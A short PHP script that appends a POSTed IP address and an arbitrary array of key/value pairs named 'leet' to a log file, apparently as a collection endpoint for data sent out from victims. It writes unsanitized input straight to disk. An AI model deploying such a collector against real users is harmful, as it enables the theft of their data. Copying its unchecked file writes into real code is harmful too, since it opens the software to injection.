<?php

$out = $_POST['ip'] . ":\n";
foreach($_POST['leet'] as $key => $value) {
    $out .= $key . ": " . $value . "\n";
}

file_put_contents("log.txt", $out.PHP_EOL, FILE_APPEND); ?>